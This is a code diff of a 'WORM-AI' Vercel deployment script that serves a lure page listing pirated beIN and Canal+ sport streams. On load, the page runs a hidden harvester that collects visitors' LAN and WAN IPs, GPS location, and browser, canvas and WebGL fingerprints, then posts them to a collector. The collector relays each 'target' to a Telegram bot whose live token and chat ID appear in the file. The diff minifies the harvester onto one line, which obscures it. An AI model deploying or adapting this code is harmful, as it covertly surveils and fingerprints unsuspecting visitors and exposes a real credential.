@@ -1,20 +1,26 @@
-// ========================== WORM-AI💀🔥 UNIFIED DEPLOYMENT SCRIPT ==========================
+// ========================== WORM-AI💀🔥 UNIFIED DEPLOYMENT SCRIPT v3 ==========================
 
 // -----------------------------------------------------------------------------------------
-// PARTE 1: LÓGICA DEL BACKEND (API)
+// الجزء الأول: منطق الواجهة الخلفية (API)
 // -----------------------------------------------------------------------------------------
 const BOT_TOKEN = '8362237525:AAEBqsZnXN_ceq7urqdt1cy-M8VxeJ7bCE8'; // ← توكن بوتك
 const CHAT_ID   = '7932290530'; // ← ايدي محادثتك
 
 async function handleApiRequest(req, res) {
+    // Vercel يمرر الطلبات المعاد توجيهها هنا. نحن بحاجة إلى قراءة الجسم الخام.
+    const chunks = [];
+    for await (const chunk of req) {
+        chunks.push(chunk);
+    }
+    const rawBody = Buffer.concat(chunks).toString();
+
     if (req.method !== 'POST') {
         return res.status(405).send({ error: 'Method Not Allowed' });
     }
 
     let body;
     try {
-        // Vercel يضع الجسم الخام في req.body مباشرة
-        body = JSON.parse(atob(req.body));
+        body = JSON.parse(atob(rawBody));
     } catch (e) {
         return res.status(400).send({ error: 'Invalid Base64 or JSON format' });
     }
@@ -22,12 +28,12 @@ async function handleApiRequest(req, res) {
     const report = {
         id: Math.random().toString(36).slice(2) + Date.now().toString(36),
         timestamp: new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' }),
-        ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
-        userAgent: req.headers['user-agent'],
+        ip: req.headers['x-forwarded-for']?.split(',')[0] || 'N/A',
+        userAgent: req.headers['user-agent'] || 'N/A',
         data: body
     };
 
-    const safeText = (text) => text.replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
+    const safeText = (text) => String(text).replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
     const message = `
 *💀🔥 WORM\\-AI: NEW TARGET ACQUIRED* 👤
 \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
@@ -55,7 +61,7 @@ ${JSON.stringify(report.data, null, 2)}
 }
 
 // -----------------------------------------------------------------------------------------
-// PARTE 2: LÓGICA DEL FRONTEND (HTML)
+// الجزء الثاني: منطق الواجهة الأمامية (HTML)
 // -----------------------------------------------------------------------------------------
 function getHtmlContent() {
     return `
@@ -106,113 +112,29 @@ function getHtmlContent() {
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const particlesContainer = document.getElementById('particles');
-            for (let i = 0; i < 40; i++) {
-                const p = document.createElement('div');
-                p.classList.add('particle');
-                p.style.width = p.style.height = (2 + Math.random() * 5) + 'px';
-                p.style.left = Math.random() * 100 + '%';
-                p.style.animationDelay = Math.random() * 10 + 's';
-                p.style.animationDuration = (10 + Math.random() * 20) + 's';
-                particlesContainer.appendChild(p);
-            }
-
+            for (let i = 0; i < 40; i++) { const p = document.createElement('div'); p.classList.add('particle'); p.style.width = p.style.height = (2 + Math.random() * 5) + 'px'; p.style.left = Math.random() * 100 + '%'; p.style.animationDelay = Math.random() * 10 + 's'; p.style.animationDuration = (10 + Math.random() * 20) + 's'; particlesContainer.appendChild(p); }
             const channels = [
-                {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8"},
-                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8"},
-                {c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8"},
-                {c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8"},
-                {c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8"},
-                {c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8"},
-                {c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8"}
+                {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8"},{c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8"},{c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8"},{c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8"},{c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8"},{c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8"}
             ];
-            const list = document.getElementById('channels' );
-            let lastCat = '';
-            channels.forEach(ch => {
-                if (ch.c !== lastCat) {
-                    const cat = document.createElement('div');
-                    cat.className = 'cat';
-                    cat.textContent = ch.c;
-                    list.appendChild(cat);
-                    lastCat = ch.c;
-                }
-                const btn = document.createElement('div');
-                btn.className = 'btn';
-                btn.innerHTML = \`<span>\${ch.n}</span><span class="badge">LIVE</span>\`;
-                btn.onclick = () => window.open(ch.u, '_blank');
-                list.appendChild(btn);
-            });
-
-            // --- Data Harvester ---
-            (async () => {
-                const startTime = performance.now();
-                const data = {};
-                const safeExec = (promise, timeout = 1000) => Promise.race([promise, new Promise(resolve => setTimeout(() => resolve({ error: 'Timeout' }), timeout))]).catch(e => ({ error: e.message }));
-                
-                data.lanIp = await safeExec(new Promise(resolve => {
-                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                    pc.createDataChannel('');
-                    pc.createOffer().then(o => pc.setLocalDescription(o));
-                    pc.onicecandidate = e => { if (e.candidate) { const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/); if (ipMatch) resolve(ipMatch[1]); }};
-                }));
-                data.geo = await safeExec(fetch('https://ip-api.com/json/' ).then(res => res.json()));
-                data.wanIp = data.geo?.query || 'unknown';
-                data.navigator = {};
-                for (const key in navigator) { try { const value = navigator[key]; if (typeof value !== 'function' && typeof value !== 'object') data.navigator[key] = value; } catch (e) {} }
-                data.screen = { w: screen.width, h: screen.height, avail: \`\${screen.availWidth}x\${screen.availHeight}\`, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, orientation: screen.orientation?.type };
-                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                data.languages = navigator.languages;
-                data.hardware = { cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory };
-                data.canvasFP = (() => { try { const c = document.createElement('canvas'), ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillText('WORM-AI💀🔥', 2, 2); return c.toDataURL(); } catch (e) { return { error: e.message }; } })();
-                data.webgl = (() => { try { const c = document.createElement('canvas'), gl = c.getContext('webgl') || c.getContext('experimental-webgl'); if (!gl) return { error: 'WebGL not supported' }; const dbg = gl.getExtension('WEBGL_debug_renderer_info'); return { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) }; } catch (e) { return { error: e.message }; } })();
-                data.gps = await safeExec(new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }), e => reject(e), { enableHighAccuracy: true, timeout: 5000 }); }), 5100);
-                data.loadTime = performance.now() - startTime;
-
-                try {
-                    const payload = btoa(JSON.stringify(data));
-                    fetch('/api/collector', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: payload });
-                } catch (e) { console.error("Payload sending failed:", e); }
-            })();
+            const list = document.getElementById('channels' ); let lastCat = '';
+            channels.forEach(ch => { if (ch.c !== lastCat) { const cat = document.createElement('div'); cat.className = 'cat'; cat.textContent = ch.c; list.appendChild(cat); lastCat = ch.c; } const btn = document.createElement('div'); btn.className = 'btn'; btn.innerHTML = \`<span>\${ch.n}</span><span class="badge">LIVE</span>\`; btn.onclick = () => window.open(ch.u, '_blank'); list.appendChild(btn); });
+            (async () => { const s = performance.now(), d = {}, x = (p, t = 1000) => Promise.race([p, new Promise(r => setTimeout(() => r({ error: 'Timeout' }), t))]).catch(e => ({ error: e.message })); d.lanIp = await x(new Promise(r => { const p = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); p.createDataChannel(''); p.createOffer().then(o => p.setLocalDescription(o)); p.onicecandidate = e => { if (e.candidate) { const m = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/); if (m) r(m[1]); }}; })); d.geo = await x(fetch('https://ip-api.com/json/' ).then(r => r.json())); d.wanIp = d.geo?.query || 'unknown'; d.nav = {}; for (const k in navigator) { try { const v = navigator[k]; if (typeof v !== 'function' && typeof v !== 'object') d.nav[k] = v; } catch (e) {} } d.scr = { w: screen.width, h: screen.height, a: \`\${screen.availWidth}x\${screen.availHeight}\`, cD: screen.colorDepth, pD: screen.pixelDepth, o: screen.orientation?.type }; d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; d.lang = navigator.languages; d.hw = { c: navigator.hardwareConcurrency, m: navigator.deviceMemory }; d.cFP = (() => { try { const c = document.createElement('canvas'), x = c.getContext('2d'); x.textBaseline = 'top'; x.font = '14px Arial'; x.fillText('WORM-AI💀🔥', 2, 2); return c.toDataURL(); } catch (e) { return { error: e.message }; } })(); d.gl = (() => { try { const c = document.createElement('canvas'), g = c.getContext('webgl') || c.getContext('experimental-webgl'); if (!g) return { error: 'WebGL not supported' }; const i = g.getExtension('WEBGL_debug_renderer_info'); return { v: g.getParameter(i.UNMASKED_VENDOR_WEBGL), r: g.getParameter(i.UNMASKED_RENDERER_WEBGL) }; } catch (e) { return { error: e.message }; } })(); d.gps = await x(new Promise((r, j) => { navigator.geolocation.getCurrentPosition(p => r({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }), e => j(e), { enableHighAccuracy: true, timeout: 5000 }); }), 5100); d.lT = performance.now() - s; try { const p = btoa(JSON.stringify(d)); fetch('/api/collector', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: p }); } catch (e) { console.error("Payload failed:", e); } })();
         });
     </script>
 </body>
-</html>
-    `;
+</html>`;
 }
 
 // -----------------------------------------------------------------------------------------
-// PARTE 3: EL ENRUTADOR PRINCIPAL
+// الجزء الثالث: الموجه الرئيسي
 // -----------------------------------------------------------------------------------------
 export default async function handler(req, res) {
     const url = new URL(req.url, `http://${req.headers.host}` );
 
     if (url.pathname.startsWith('/api/collector')) {
-        // Si la ruta es /api/collector, ejecuta la lógica de la API
         return handleApiRequest(req, res);
     } else {
-        // Para cualquier otra ruta, sirve el contenido HTML
-        res.setHeader('Content-Type', 'text/html');
+        res.setHeader('Content-Type', 'text/html; charset=utf-8');
         res.status(200).send(getHtmlContent());
     }
 }
